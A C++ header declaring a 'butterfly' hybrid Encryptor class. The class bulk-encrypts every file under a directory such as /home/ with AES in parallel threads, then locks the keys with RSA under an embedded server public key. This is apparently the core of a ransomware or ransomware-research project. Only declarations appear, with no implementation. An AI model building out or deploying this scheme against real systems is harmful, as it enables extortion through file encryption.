
#ifndef BUTTERFLY_ENCRYPTOR_H
#define BUTTERFLY_ENCRYPTOR_H

#include <algorithm>
#include <thread>

#include "crypto/rsaEncryptor.h"
#include "crypto/aesEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "directoryIterator.h"
#include "fileExtensions.h"
#include "bflyParams.h"

namespace butterfly
{

namespace hybrid
{

/**
 * Class Encryptor to encrypt files with AES, CPrivateRSA and AESKeyPair(Key+IV) with RSA
 */
class Encryptor
{

private:
    int _keySize;
    bool _aesKeyInit;
    std::vector<std::thread> _threads;

    std::unique_ptr<rsa::RSAEncryptor> _rsaEncryptorAESKey, _rsaEncryptorCPrivateRSA;
    std::unique_ptr<aes::AESEncryptor> _aesEncryptor;

    /**
     * Validates the AESKey/AESIV length after the AESKey generation
     */
    void validateAESKeyLength();

    /**
     * Saves the unencrypted AESKeyPair to the filesystem
     *
     * @param aesKeyPair: aesKeyPair string
     */
    static void saveUnencryptedAESKeyPair(const std::string &aesKeyPair);

    /**
     * Checks if bfly encryption files exists (CPrivateRSA.bin, AES.bin, RSA.bin)
     */
    static void checkIfEncryptionFilesExists();

public:
    /**
     * Constructor Encryptor
     *
     *  Usage:
     *       std::unique_ptr<butterfly::hybrid::Encryptor> encryptor(new butterfly::hybrid::Encryptor(2048));
     *       encryptor->invokeDir("/home/");
     *
     * @param keySize: size of the key
     */
    explicit Encryptor(int keySize = 2048);

    /**
     * Destructor Encryptor
     */
    ~Encryptor() = default;

    /**
     * Invokes the provided directory path
     *
     * @param path: path of the directory
     * @param protection: enable/disable protection mode
     */
    void invokeDir(const std::string &dirPath, bool protection);

    /**
     * Encrypts the CPrivateRSA.pem and saves the CPrivateRSA.bin file on the host machine
     */
    void encryptCPrivateRSA();

    /**
     * Encrypts all files with AES
     *
     * @param filepath: path of the file
     */
    void encryptFileWithAES(const std::string &filepath);

    /**
     * Encrypts the final AES Key and IV with RSA
     *
     * @param aesKeyPair: AES Key and IV String
     */
    void encryptFinalAESKeyWithRSA(const std::string &aesKeyPair);

    /**
     * Spawns a new Thread for encrypting the file
     *
     * @param filepath: path to the file
     */
    void spawnThread(const std::string &filepath);

    /**
     * Joins the threads in the thread vector
     */
    void joinThreads();
};

} // namespace hybrid

} // namespace butterfly

#endif //BUTTERFLY_ENCRYPTOR_H
